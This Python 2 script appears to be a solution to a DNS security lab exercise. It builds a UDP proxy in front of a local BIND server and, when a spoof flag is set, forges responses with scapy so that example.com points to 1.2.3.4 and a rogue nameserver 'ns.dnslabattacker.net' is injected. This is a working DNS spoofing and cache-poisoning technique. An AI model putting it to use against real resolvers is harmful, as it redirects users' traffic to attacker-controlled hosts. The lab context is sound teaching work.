#!/usr/bin/env python2
import argparse
import socket
from scapy.all import DNS, DNSRR

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
proxy_port = args.port
proxy_addr = '127.0.0.1'
# BIND's port
dns_port = args.dns_port
dns_addr = '127.0.0.1'
# Flag to indicate if the proxy should spoof responses
spoof = args.spoof_response
spoof_addr = "1.2.3.4"
spoof_ns = "ns.dnslabattacker.net"
spoof_domain = "example.com"

# Create server socket (for communicating with dig as "server")
server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server.bind((proxy_addr, proxy_port))
print("DNS Proxy Server running on {}:{}".format(proxy_addr, proxy_port))
print("Forwarding DNS queries to {}:{}".format(dns_addr, dns_port))

while True:
  query_data, (dig_addr, dig_port) = server.recvfrom(4096)  

  if not query_data:
    break

  print("Received DNS query from {}:{}".format(dig_addr, dig_port))
  # print("query_data",query_data)
  # Create client socket (for communicating with BIND server as "client")
  client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  client.settimeout(5) #close socket if no more reponse from BIND for 5 more seconds
  # Forward the DNS query to the BIND DNS server
  try:
    client.sendto(query_data, (dns_addr, dns_port))
  except socket.error as e:
    print("Error sending to DNS server:", e)
    break

  while True:
    try:
      response_data, (response_addr, response_port) = client.recvfrom(4096)
      print("ressponse")
    except socket.error as e:
      print("Error receiving response from DNS server:", e)
      break
    if not response_data:
      break

    # parse raw binary DNS packet
    dns_response_data = DNS(response_data) 

    # Send the DNS response back to the dig (#part3: spoof flag is true)
    if spoof: 
      # modify dns response addr
      dns_response_data[DNS].ancount = 1
      dns_response_data[DNS].an = DNSRR(rrname=spoof_domain, type='A', rdata=spoof_addr)
      # modify dns response nameserver
      dns_response_data[DNS].nscount = 2
      dns_response_data[DNS].ns = DNSRR(rrname=spoof_domain, type='NS', rdata=spoof_ns)/DNSRR(rrname=spoof_domain, type='NS', rdata=spoof_ns)

    # Send the DNS response back to the dig (part2: unmodified)
    server.sendto(bytes(dns_response_data), (dig_addr, dig_port))

  client.close()
  print("close client, no more conmmunication with BIND")
  break

server.close()
print("close server")

  


